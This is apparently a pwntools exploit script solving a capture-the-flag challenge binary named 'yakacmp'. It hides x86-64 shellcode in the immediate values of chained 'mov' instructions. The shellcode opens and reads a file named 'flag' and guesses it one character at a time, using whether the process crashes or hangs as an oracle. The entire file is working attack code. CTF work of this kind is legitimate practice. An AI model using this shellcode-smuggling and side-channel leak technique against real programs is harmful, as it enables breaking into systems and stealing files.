import time

from pwn import *
context(arch='amd64')
flag = ''

elf = ELF('./yakacmp')
io = process('./yakacmp')

def make_add(reg1, reg2):
    return b'add ' + reg1 + b',' + reg2

def make_sub(reg1, reg2):
    return b'sub ' + reg1 + b',' + reg2

def make_chg(reg1, reg2):
    return b'chg ' + reg1 + b',' + reg2

def make_mov(reg1, reg2):
    return b'mov ' + reg1 + b',' + reg2

def make_ret():
    return b'ret'

def send_code(code):
    io.sendlineafter(b'more operation?', code)

for i in range(0x40):
    added = False
    for j in range(ord('0'), 0x80):
        code =    make_mov(b'r1', str(0x67616C66).encode())
        io.sendlineafter(b'some code now', code)
        send_code(make_mov(b'r2', str(0x72eb_00_b1188a + (j << 24)).encode()))
        send_code(make_mov(b'r2', str(0xf0ebdb314858).encode()))
        send_code(make_mov(b'r2', str(0xefeb23330f_00_68 + (i << 8)).encode()))
        send_code(make_mov(b'r2', str(0xefeb050f58006a).encode()))
        send_code(make_mov(b'r2', str(0xf0eb5a406a5e).encode()))
        send_code(make_mov(b'r2', str(0xefeb23330f0068).encode()))
        send_code(make_mov(b'r2', str(0xefeb5f036a050f).encode()))
        send_code(make_mov(b'r2', str(0xefeb585f5e006a).encode()))
        send_code(make_mov(b'r2', str(0xefeb2333000268).encode()))
        send_code(make_mov(b'r2', str(0xf1eb00000002).encode()))
        send_code(make_mov(b'r2', str(0xfeeb1875cb38).encode()))
        send_code(make_mov(b'r2', str(0xc3).encode()))
        send_code(b'NO')
        io.recvuntil(b'over\n')
        time.sleep(0.2)
        if not io.connected():
            print('character #%d is not %c' % (i, chr(j)))
            io.close()
            io = process('./yakacmp')
        else:
            added = True
            print('character #%d : %c' % (i, chr(j)))
            flag += chr(j)
            io.close()
            io = process('./yakacmp')
            break
    if not added:
        print(flag)
        exit(0)
    else:
        added = False